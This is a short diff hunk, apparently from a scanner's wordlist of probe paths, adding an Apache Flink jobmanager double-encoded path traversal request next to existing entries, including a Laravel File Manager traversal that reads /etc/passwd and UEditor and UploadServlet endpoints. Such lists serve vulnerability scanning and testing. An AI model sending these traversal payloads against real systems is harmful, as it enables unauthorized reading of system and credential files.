@@ -3,3 +3,4 @@
 /laravel-filemanager/download?working_dir=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2F&type=&file=passwd
 /ueditor/net/controller.ashx?action=catchimage&encode=utf-8
 /service/~baseapp/UploadServlet
+/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fpoc
